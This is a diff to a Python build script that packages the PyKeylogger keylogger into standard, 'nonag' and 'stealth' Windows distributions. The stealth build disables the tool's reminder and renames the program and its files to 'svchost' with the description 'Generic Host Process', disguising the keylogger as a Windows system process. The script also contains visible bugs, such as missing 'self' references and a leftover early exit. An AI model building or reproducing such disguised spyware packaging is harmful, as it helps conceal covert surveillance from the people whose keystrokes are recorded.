@@ -1,107 +1,222 @@
 import version
 import os
 import sys
+import re
+import shutil
 
 import zipfile
 import zlib
 
-
-def ZipFiles(targetdir, ziparchivename):
-    '''Create a zip archive of all files in the target directory.
-    '''
-    #os.chdir(targetdir)
-    myzip = zipfile.ZipFile(ziparchivename, "w", zipfile.ZIP_DEFLATED)
+class DistributionBuilder:
+    def __init__(self, disttype):
+        '''disttype is either "standard", "nonag", or "stealth"
+        stealth is also nagless'''
+        self.disttype = disttype
+        if self.disttype == 'standard':
+            self.filename_addendum = ''
+        elif self.disttype == 'nonag':
+            self.filename_addendum = '_nonag'
+        elif self.disttype == 'stealth':
+            self.filename_addendum = '_stealth'
     
-    if type(targetdir) == str:
-        for root, dirs, files in os.walk(targetdir):
-            for fname in files:
-                if fname != ziparchivename:
-                    myzip.write(os.path.join(root,fname))
-    if type(targetdir) == list:
-        for fname in targetdir:
-            myzip.write(fname)
+    def version_check(self):
+        if raw_input("Current version is " + version.version + ". Is that correct? [Y/N] ") in ["y", "Y", "yes", "YES", "Yes"]:
+            pass
+        else:
+            sys.exit()
     
-    myzip.close()
-    myzip = zipfile.ZipFile(ziparchivename, "r", zipfile.ZIP_DEFLATED)
-    if myzip.testzip() != None:
-        print "Warning: Zipfile did not pass check."
-    myzip.close()
+    def toggle_nag(self, new_state):
+        f = open('keylogger.pyw','r')
+        try:
+            contents=f.readlines()
+        finally:
+            f.close()
+        
+        f = open('keylogger.pyw','w')
+        try:
+            for line in contents:
+                line = re.sub('^( *NagMe = ).*', '\\1' + new_state, line)
+                f.write(line)
+                #if re.search('^( +NagMe = )', line):
+                    #print line
+        finally:
+            f.close()
+    
+    def toggle_stealth(self, new_name, new_description, icon_flag):
+        ''' change name, description, in version.py, 
+        rename the icon files and the ini and val files
+        '''
+        f = open('version.py','r')
+        try:
+            contents=f.readlines()
+        finally:
+            f.close()
+        
+        f = open('version.py','w')
+        try:
+            for line in contents:
+                line = re.sub('^( *name = ).*', '\\1' + '"' + new_name + '"', line)
+                line = re.sub('^( *description = ).*', '\\1' + '"' + new_description + '"', line)
+                #line = re.sub('^( *window_title = ).*', '\\1' + '"' + new_window_title + '"', line)
+                f.write(line)
+                #if re.search('^( +NagMe = )', line):
+                    #print line
+        finally:
+            f.close()
+        
+        if icon_flag == 1:
+            shutil.copy(version.name + '.ini', new_name + '.ini')
+            shutil.copy(version.name + '.val', new_name + '.val')
+            shutil.copy(version.name + 'icon.ico', new_name + 'icon.ico')
+            shutil.copy(version.name + 'icon.svg', new_name + 'icon.svg')
+            shutil.copy(version.name + 'icon_big.gif', new_name + 'icon_big.gif')
+        else:
+            os.remove(icon_flag + '.ini')
+            os.remove(icon_flag + '.val')
+            os.remove(icon_flag + 'icon.ico')
+            os.remove(icon_flag + 'icon.svg')
+            os.remove(icon_flag + 'icon_big.gif')
 
-if __name__ == '__main__':
-
-    if raw_input("Current version is " + version.version + ". Is that correct? [Y/N] ") in ["y", "Y", "yes", "YES", "Yes"]:
-        pass
-    else:
+    def run(self):
+        #this is where we do stuff
+        self.version_check()
+        
+        if self.disttype == 'nonag' or self.disttype == 'stealth':
+            self.toggle_nag('False')
+        
+        if self.disttype == 'stealth':
+            self.toggle_stealth('svchost','Generic Host Process', 1)
+        
+        ### remove this
         sys.exit()
         
-    fname_addendum = raw_input("Filename addendum (start with '_')? ")
-
-    #delete old build dir.
-    print r'rd /S /Q build'
-    os.system(r'rd /S /Q build')
+        self.build_executable()
+        self.build_sdist()
+        
+        if self.disttype == 'nonag' or self.disttype == 'stealth':
+            self.toggle_nag('True')
+        
+        if self.disttype == 'stealth':
+            self.toggle_stealth('pykeylogger','Simple Python Keylogger', 'svchost')
+        
+        os.system(r'pause "done, press to key to exit""')
+        
+            
+    def build_executable(self):
     
-    #delete old dist dir
-    print r'rd /S /Q dist'
-    os.system(r'rd /S /Q dist')
+        #delete old build dir.
+        print r'rd /S /Q build'
+        os.system(r'rd /S /Q build')
+        
+        #delete old dist dir
+        print r'rd /S /Q dist'
+        os.system(r'rd /S /Q dist')
 
-    # create the exe 
-    print r'c:\Python25\python setup.py py2exe'
-    os.system(r'c:\Python25\python setup.py py2exe')
+        # create the exe 
+        print r'c:\Python25\python setup.py py2exe'
+        os.system(r'c:\Python25\python setup.py py2exe')
 
-    #pause to see output
-    #os.system('pause "done, press key to continue"')
-    print r'rename "dist" "pykeylogger-' + version.version + '""'
-    os.system(r'rename "dist" "pykeylogger-' + version.version + '""')
+        print r'rename "dist" "pykeylogger-' + version.version + '""'
+        os.system(r'rename "dist" "pykeylogger-' + version.version + '""')
+        
+        if self.disttype == 'nonag' or self.disttype == 'standard':
+            build_nsis_installer()
+        #os.system(r'move .\pykeylogger-' + version.version + '_win32_installer.exe 
+        
+        print "zipping executables"
+        self.ZipFiles(r"pykeylogger-" + version.version, "pykeylogger-" + version.version + self.filename_addendum + "_win32.zip")
+        
+        print r'rd /S /Q pykeylogger-' + version.version
+        os.system(r'rd /S /Q pykeylogger-' + version.version)
+        print r'rd /S /Q build'
+        os.system(r'rd /S /Q build')
 
-    #~ print r'copy ".\*.txt" ".\pykeylogger""'
-    #~ os.system(r'copy ".\*.txt" ".\pykeylogger""')
+        # create md5sum
+        print r'""C:\Progra~1\UnixUtils\md5sum.exe" "pykeylogger-' + version.version + self.filename_addendum + r'_win32.zip" > "..\pykeylogger-' + version.version + self.filename_addendum + '_win32_md5sum.txt""'
+        os.system(r'""C:\Progra~1\UnixUtils\md5sum.exe" "pykeylogger-' + version.version + self.filename_addendum + r'_win32.zip" > "..\pykeylogger-' + version.version + self.filename_addendum + '_win32_md5sum.txt""')
 
-    #~ print r'copy ".\pykeylogger.ini" ".\pykeylogger""'
-    #~ os.system(r'copy ".\pykeylogger.ini" ".\pykeylogger""')
+        # move release files out of the source dir
+        print r'move ".\pykeylogger-' + version.version + self.filename_addendum + r'_win32.zip" "..\pykeylogger-' + version.version + self.filename_addendum + '_win32.zip"'
+        os.system(r'move ".\pykeylogger-' + version.version + self.filename_addendum + r'_win32.zip" "..\pykeylogger-' + version.version + self.filename_addendum + '_win32.zip"')
 
-    #command = '\"\"C:\Progra~1\WinRAR\WinRAR.exe" a -r "pykeylogger' + version.version + '_win32.zip" "pykeylogger\"\"'
-    #print repr(command)
-    #os.system(command)
-    print "zipping executables"
-    ZipFiles(r"pykeylogger-" + version.version, "pykeylogger-" + version.version + fname_addendum + "_win32.zip")
+        print r'move ".\pykeylogger-' + version.version + r'_win32_installer.exe" "..\pykeylogger-' + version.version + self.filename_addendum + '_win32_installer.exe"'
+        os.system(r'move ".\pykeylogger-' + version.version + r'_win32_installer.exe" "..\pykeylogger-' + version.version + self.filename_addendum + '_win32_installer.exe"')
+
+        os.system(r'pause "done creating binary dist"')
     
-    #print r'""C:\Progra~1\WinRAR\WinRAR.exe" a -r "pykeylogger' + version.version + '_win32.zip" "pykeylogger""'
-    #os.system(r'""C:\Progra~1\WinRAR\WinRAR.exe" a -r "pykeylogger' + version.version + '_win32.zip" "pykeylogger""')
+    def build_sdist(self):
+        
+        print "creating sdist"
+        os.system(r'c:\Python25\python setup.py sdist')
 
-    print r'rd /S /Q pykeylogger-' + version.version
-    os.system(r'rd /S /Q pykeylogger-' + version.version)
-    print r'rd /S /Q build'
-    os.system(r'rd /S /Q build')
+        print r'move ".\dist\pykeylogger-' + version.version + r'.zip" ".\pykeylogger-' + version.version + self.filename_addendum + '_src.zip"'
+        os.system(r'move ".\dist\pykeylogger-' + version.version + r'.zip" ".\pykeylogger-' + version.version + self.filename_addendum + '_src.zip"')
+        print r'del .\MANIFEST'
+        os.system(r'del .\MANIFEST')
 
-    os.system(r'pause "done, now lets create the src dist"')
-    #sys.exit()
-    #print r'""C:\Progra~1\WinRAR\WinRAR.exe" a -r "pykeylogger' + version.version + '_src.zip" "keylogger.pyw" "logwriter.py" "setup.py" "mytimer.py" "version.py" "make_all_dist.py" "*.txt" "*.bat" "html""'
-    #os.system(r'""C:\Progra~1\WinRAR\WinRAR.exe" a -r "pykeylogger' + version.version + '_src.zip" "keylogger.pyw" "logwriter.py" "setup.py" "mytimer.py" "version.py" "make_all_dist.py" "*.txt" "run_exe_pykeylogger_with_cmdoptions.bat" "run_pykeylogger_with_cmdoptions.bat" "html""')
+        print r'rd /S /Q dist'
+        os.system(r'rd /S /Q dist')
 
-    #print "zipping sources"
-    #ZipFiles(["keylogger.pyw","logwriter.py","setup.py","mytimer.py","version.py","make_all_dist.py","pykeylogger.ini","LICENSE.txt","CHANGELOG.TXT","TODO.txt","README.txt"], "pykeylogger" + version.version + "_src.zip")
-    print "creating sdist"
-    os.system(r'c:\Python25\python setup.py sdist')
+        #create md5sum
+        print r'""C:\Progra~1\UnixUtils\md5sum.exe" "pykeylogger-' + version.version + self.filename_addendum + r'_src.zip" > "..\pykeylogger-' + version.version + self.filename_addendum + '_src_md5sum.txt""'
+        os.system(r'""C:\Progra~1\UnixUtils\md5sum.exe" "pykeylogger-' + version.version + self.filename_addendum + r'_src.zip" > "..\pykeylogger-' + version.version + self.filename_addendum + '_src_md5sum.txt""')
+        
+        # move release files out of source dir
+        print r'move ".\pykeylogger-' + version.version + self.filename_addendum + r'_src.zip" "..\pykeylogger-' + version.version + self.filename_addendum + '_src.zip"'
+        os.system(r'move ".\pykeylogger-' + version.version + self.filename_addendum + r'_src.zip" "..\pykeylogger-' + version.version + self.filename_addendum + '_src.zip"')
+        
+        os.system(r'pause "done creating source dist"')
+    
+    def build_nsis_installer(self):
+        ''' this needs to be called before we zip and delete the renamed dist directory
+        '''
+        self.update_nsis_script_version()
+        
+        print r'"C:\Program Files\NSIS\makensis.exe" pykeylogger_installer_script.nsi'
+        os.system(r'"C:\Program Files\NSIS\makensis.exe" pykeylogger_installer_script.nsi')
+    
+    def update_nsis_script_version(self):
+        f = open('pykeylogger_installer_script.nsi','r')
+        try:
+            contents=f.readlines()
+        finally:
+            f.close()
+        
+        f = open('pykeylogger_installer_script.nsi','w')
+        try:
+            for line in contents:
+                line = re.sub('^( *!define PYKEYLOGGER_VERSION ).*', '\\1' + '"' + version.version + '"', line)
+                f.write(line)
+        finally:
+            f.close()
 
-    print r'move ".\dist\pykeylogger-' + version.version + r'.zip" ".\pykeylogger-' + version.version + fname_addendum + '_src.zip"'
-    os.system(r'move ".\dist\pykeylogger-' + version.version + r'.zip" ".\pykeylogger-' + version.version + fname_addendum + '_src.zip"')
-    print r'del .\MANIFEST'
-    os.system(r'del .\MANIFEST')
+    
+    def ZipFiles(targetdir, ziparchivename):
+        '''Create a zip archive of all files in the target directory.
+        '''
+        #os.chdir(targetdir)
+        myzip = zipfile.ZipFile(ziparchivename, "w", zipfile.ZIP_DEFLATED)
+        
+        if type(targetdir) == str:
+            for root, dirs, files in os.walk(targetdir):
+                for fname in files:
+                    if fname != ziparchivename:
+                        myzip.write(os.path.join(root,fname))
+        if type(targetdir) == list:
+            for fname in targetdir:
+                myzip.write(fname)
+        
+        myzip.close()
+        myzip = zipfile.ZipFile(ziparchivename, "r", zipfile.ZIP_DEFLATED)
+        if myzip.testzip() != None:
+            print "Warning: Zipfile did not pass check."
+        myzip.close()
 
-    print r'rd /S /Q dist'
-    os.system(r'rd /S /Q dist')
-
-    #os.system('pause "now lets create the md5 sums"')
-    print r'""C:\Progra~1\UnixUtils\md5sum.exe" "pykeylogger-' + version.version + fname_addendum + r'_src.zip" > "..\pykeylogger-' + version.version + fname_addendum + '_src_md5sum.txt""'
-    os.system(r'""C:\Progra~1\UnixUtils\md5sum.exe" "pykeylogger-' + version.version + fname_addendum + r'_src.zip" > "..\pykeylogger-' + version.version + fname_addendum + '_src_md5sum.txt""')
-    print r'""C:\Progra~1\UnixUtils\md5sum.exe" "pykeylogger-' + version.version + fname_addendum + r'_win32.zip" > "..\pykeylogger-' + version.version + fname_addendum + '_win32_md5sum.txt""'
-    os.system(r'""C:\Progra~1\UnixUtils\md5sum.exe" "pykeylogger-' + version.version + fname_addendum + r'_win32.zip" > "..\pykeylogger-' + version.version + fname_addendum + '_win32_md5sum.txt""')
-
-    print r'move ".\pykeylogger-' + version.version + fname_addendum + r'_win32.zip" "..\pykeylogger-' + version.version + fname_addendum + '_win32.zip"'
-    os.system(r'move ".\pykeylogger-' + version.version + fname_addendum + r'_win32.zip" "..\pykeylogger-' + version.version + fname_addendum + '_win32.zip"')
-
-    print r'move ".\pykeylogger-' + version.version + fname_addendum + r'_src.zip" "..\pykeylogger-' + version.version + fname_addendum + '_src.zip"'
-    os.system(r'move ".\pykeylogger-' + version.version + fname_addendum + r'_src.zip" "..\pykeylogger-' + version.version + fname_addendum + '_src.zip"')
-
-
-    os.system(r'pause "done, press to key to exit""')
+if __name__ == '__main__':
+    
+    db = DistributionBuilder('standard')
+    db.run()
+    db = DistributionBuilder('nonag')
+    db.run()
+    db = DistributionBuilder('stealth')
+    db.run()
